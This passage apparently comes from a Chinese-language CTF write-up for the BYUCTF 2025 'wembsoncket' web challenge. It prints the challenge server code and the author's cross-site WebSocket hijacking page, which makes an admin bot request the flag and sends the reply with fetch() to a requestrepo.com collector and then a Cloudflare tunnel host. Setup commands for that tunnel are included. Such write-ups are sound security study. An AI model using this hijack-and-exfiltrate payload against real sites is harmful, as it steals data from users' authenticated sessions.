</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// server.js
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>express</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;express&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>jwt</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;jsonwebtoken&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>cookieParser</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;cookie-parser&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>path</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;path&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=p>{</span> <span class=nx>v4</span><span class=o>:</span> <span class=nx>uuidv4</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;uuid&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>http</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;http&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>WebSocket</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;ws&#39;</span><span class=p>);</span> <span class=c1>// WebSocket library
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>fs</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;fs&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=p>{</span> <span class=nx>visitUrl</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;./adminBot&#39;</span><span class=p>);</span> <span class=c1>// Import the visitUrl function
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>app</span> <span class=o>=</span> <span class=nx>express</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>port</span> <span class=o>=</span> <span class=mi>3000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Secret key for signing JWT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>JWT_SECRET</span> <span class=o>=</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>readFileSync</span><span class=p>(</span><span class=s1>&#39;secret.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;utf8&#39;</span><span class=p>).</span><span class=nx>trim</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>FLAG</span> <span class=o>=</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>readFileSync</span><span class=p>(</span><span class=s1>&#39;flag.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;utf8&#39;</span><span class=p>).</span><span class=nx>trim</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Middleware to parse cookies
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>cookieParser</span><span class=p>());</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Create HTTP server
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>server</span> <span class=o>=</span> <span class=nx>http</span><span class=p>.</span><span class=nx>createServer</span><span class=p>(</span><span class=nx>app</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Create a WebSocket server
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>wss</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebSocket</span><span class=p>.</span><span class=nx>Server</span><span class=p>({</span> <span class=nx>server</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Middleware to check for a valid JWT cookie
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>checkCookie</span> <span class=o>=</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>token</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>cookies</span><span class=p>.</span><span class=nx>token</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// If the user does not have a token, generate a new one
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>token</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>userId</span> <span class=o>=</span> <span class=nx>uuidv4</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>jwtToken</span> <span class=o>=</span> <span class=nx>jwt</span><span class=p>.</span><span class=nx>sign</span><span class=p>({</span> <span class=nx>userId</span> <span class=p>},</span> <span class=nx>JWT_SECRET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>cookie</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>,</span> <span class=nx>jwtToken</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>httpOnly</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>sameSite</span><span class=o>:</span> <span class=s1>&#39;None&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>secure</span><span class=o>:</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Verify the JWT token and get the userId
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kr>const</span> <span class=nx>decoded</span> <span class=o>=</span> <span class=nx>jwt</span><span class=p>.</span><span class=nx>verify</span><span class=p>(</span><span class=nx>token</span><span class=p>,</span> <span class=nx>JWT_SECRET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>req</span><span class=p>.</span><span class=nx>userId</span> <span class=o>=</span> <span class=nx>decoded</span><span class=p>.</span><span class=nx>userId</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>next</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// If the JWT token is invalid, generate a new one
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kr>const</span> <span class=nx>userId</span> <span class=o>=</span> <span class=nx>uuidv4</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>jwtToken</span> <span class=o>=</span> <span class=nx>jwt</span><span class=p>.</span><span class=nx>sign</span><span class=p>({</span> <span class=nx>userId</span> <span class=p>},</span> <span class=nx>JWT_SECRET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>cookie</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>,</span> <span class=nx>jwtToken</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>httpOnly</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>sameSite</span><span class=o>:</span> <span class=s1>&#39;None&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>secure</span><span class=o>:</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Send a message to the WebSocket
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>sendMsg</span> <span class=o>=</span> <span class=p>(</span><span class=nx>ws</span><span class=p>,</span> <span class=nx>msg</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>ws</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>({</span> <span class=nx>message</span><span class=o>:</span> <span class=nx>msg</span><span class=p>,</span> <span class=nx>sender</span><span class=o>:</span> <span class=s1>&#39;URL Bot&#39;</span> <span class=p>}));</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Serve the static files after checking the cookie
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=nx>checkCookie</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>res</span><span class=p>.</span><span class=nx>sendFile</span><span class=p>(</span><span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>__dirname</span><span class=p>,</span> <span class=s1>&#39;public&#39;</span><span class=p>,</span> <span class=s1>&#39;index.html&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// WebSocket connection handler
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>wss</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s1>&#39;connection&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>ws</span><span class=p>,</span> <span class=nx>req</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Get the userId from the cookie
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>const</span> <span class=nx>userId</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>headers</span><span class=p>.</span><span class=nx>cookie</span> <span class=o>?</span> <span class=nx>req</span><span class=p>.</span><span class=nx>headers</span><span class=p>.</span><span class=nx>cookie</span><span class=p>.</span><span class=nx>split</span><span class=p>(</span><span class=s1>&#39;token=&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span> <span class=o>:</span> <span class=kc>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>userId</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=kr>const</span> <span class=nx>decoded</span> <span class=o>=</span> <span class=nx>jwt</span><span class=p>.</span><span class=nx>verify</span><span class=p>(</span><span class=nx>userId</span><span class=p>,</span> <span class=nx>JWT_SECRET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=nx>decoded</span><span class=p>.</span><span class=nx>userId</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=nx>sendMsg</span><span class=p>(</span><span class=nx>ws</span><span class=p>,</span> <span class=sb>`Welcome! Send a URL and the admin will visit it to check if it&#39;s up`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=nx>ws</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s1>&#39;message&#39;</span><span class=p>,</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>data</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=kr>const</span> <span class=nx>message</span> <span class=o>=</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=nx>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span><span class=nx>message</span><span class=p>.</span><span class=nx>message</span> <span class=o>===</span> <span class=s1>&#39;/getFlag&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>user</span> <span class=o>===</span> <span class=s1>&#39;admin&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=nx>sendMsg</span><span class=p>(</span><span class=nx>ws</span><span class=p>,</span> <span class=sb>`Flag: </span><span class=si>${</span><span class=nx>FLAG</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=nx>sendMsg</span><span class=p>(</span><span class=nx>ws</span><span class=p>,</span> <span class=s1>&#39;You are not authorized to get the flag&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>message</span><span class=p>.</span><span class=nx>message</span><span class=p>.</span><span class=nx>startsWith</span><span class=p>(</span><span class=s1>&#39;http://&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=nx>message</span><span class=p>.</span><span class=nx>message</span><span class=p>.</span><span class=nx>startsWith</span><span class=p>(</span><span class=s1>&#39;https://&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=nx>sendMsg</span><span class=p>(</span><span class=nx>ws</span><span class=p>,</span> <span class=s1>&#39;Checking URL...&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>              <span class=kr>const</span> <span class=nx>result</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>visitUrl</span><span class=p>(</span><span class=nx>message</span><span class=p>.</span><span class=nx>message</span><span class=p>);</span> <span class=c1>// have the adminBot visit the URL
</span></span></span><span class=line><span class=cl><span class=c1></span>              <span class=k>if</span> <span class=p>(</span><span class=nx>result</span> <span class=o>===</span> <span class=s1>&#39;success&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>sendMsg</span><span class=p>(</span><span class=nx>ws</span><span class=p>,</span> <span class=sb>`</span><span class=si>${</span><span class=nx>message</span><span class=p>.</span><span class=nx>message</span><span class=si>}</span><span class=sb> is up!`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>sendMsg</span><span class=p>(</span><span class=nx>ws</span><span class=p>,</span> <span class=sb>`</span><span class=si>${</span><span class=nx>message</span><span class=p>.</span><span class=nx>message</span><span class=si>}</span><span class=sb> returned an error: </span><span class=si>${</span><span class=nx>result</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=nx>sendMsg</span><span class=p>(</span><span class=nx>ws</span><span class=p>,</span> <span class=s1>&#39;Please send a URL starting with http:// or https://&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=c1>// Invalid message
</span></span></span><span class=line><span class=cl><span class=c1></span>          <span class=nx>ws</span><span class=p>.</span><span class=nx>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=c1>// Invalid JWT
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=nx>ws</span><span class=p>.</span><span class=nx>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// No userId found in the cookie
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>ws</span><span class=p>.</span><span class=nx>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Start the HTTP server
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>server</span><span class=p>.</span><span class=nx>listen</span><span class=p>(</span><span class=nx>port</span><span class=p>,</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`Server running at http://localhost:</span><span class=si>${</span><span class=nx>port</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></td></tr></table></div></div><p>验证身份发送flag，直接劫持会话</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Malicious Page<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>h1</span><span class=p>&gt;</span>Loading...<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>ws</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebSocket</span><span class=p>(</span><span class=s1>&#39;wss://wembsoncket.chal.cyberjousting.com&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>ws</span><span class=p>.</span><span class=nx>onopen</span> <span class=o>=</span> <span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;WebSocket connection established&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nx>ws</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>({</span> <span class=nx>sender</span><span class=o>:</span> <span class=s1>&#39;user&#39;</span><span class=p>,</span> <span class=nx>message</span><span class=o>:</span> <span class=s1>&#39;/getFlag&#39;</span> <span class=p>}));</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=nx>ws</span><span class=p>.</span><span class=nx>onmessage</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(</span><span class=nx>event</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;Received message:&#34;</span><span class=p>,</span> <span class=nx>event</span><span class=p>.</span><span class=nx>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=kr>const</span> <span class=nx>data</span> <span class=o>=</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=nx>event</span><span class=p>.</span><span class=nx>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;https://4fz7yove.requestrepo.com/?flag=&#39;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>data</span><span class=p>.</span><span class=nx>message</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>收到了，但是并不是正确的Cookie，说明思路是对的，就是劫持websocket的会话，让他去访问得到flag，再带出来，后面疑问，发现怎么打都打不出来，结果一问<img src=/p/byuctf2025/QQ20250518-103216.jpg width=684 height=79 loading=lazy alt=1></p><p>昨天测试，我发现我的HK服务器，以及很多东西都会被waf，只能收到DNSLOG，不能收到http请求，所以为了解决这个问题，我打算利用CF来起一个隧道</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 添加 Cloudflare GPG 密钥</span>
</span></span><span class=line><span class=cl>curl -L https://pkg.cloudflare.com/cloudflare-main.gpg <span class=p>|</span> sudo tee /usr/share/keyrings/cloudflare-main.gpg &gt;/dev/null
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 添加 Cloudflare 软件源</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;deb [signed-by=/usr/share/keyrings/cloudflare-main.gpg] https://pkg.cloudflare.com/cloudflared </span><span class=k>$(</span>lsb_release -cs<span class=k>)</span><span class=s2> main&#34;</span> <span class=p>|</span> sudo tee /etc/apt/sources.list.d/cloudflared.list
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 更新软件包并安装</span>
</span></span><span class=line><span class=cl>sudo apt-get update
</span></span><span class=line><span class=cl>sudo apt-get install cloudflared
</span></span><span class=line><span class=cl>cloudflared --version
</span></span></code></pre></td></tr></table></div></div><p>需要登录一下<code>cloudflared login</code>，由于我只有两个域名，博客的域名开了CF会更卡，所以用的<code>rb3.top</code>，再开启通道即可<code>cloudflared tunnel --url http://localhost:80</code></p><p><img src=/p/byuctf2025/QQ20250518-111552.jpg width=1030 height=246 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Malicious Page<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>h1</span><span class=p>&gt;</span>Loading...<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>ws</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebSocket</span><span class=p>(</span><span class=s1>&#39;wss://wembsoncket.chal.cyberjousting.com&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>ws</span><span class=p>.</span><span class=nx>onopen</span> <span class=o>=</span> <span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;WebSocket connection established&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nx>ws</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>({</span> <span class=nx>sender</span><span class=o>:</span> <span class=s1>&#39;user&#39;</span><span class=p>,</span> <span class=nx>message</span><span class=o>:</span> <span class=s1>&#39;/getFlag&#39;</span> <span class=p>}));</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=nx>ws</span><span class=p>.</span><span class=nx>onmessage</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(</span><span class=nx>event</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;Received message:&#34;</span><span class=p>,</span> <span class=nx>event</span><span class=p>.</span><span class=nx>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=kr>const</span> <span class=nx>data</span> <span class=o>=</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=nx>event</span><span class=p>.</span><span class=nx>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;https://excuse-postcard-analyses-button.trycloudflare.com/?flag=&#39;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>data</span><span class=p>.</span><span class=nx>message</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
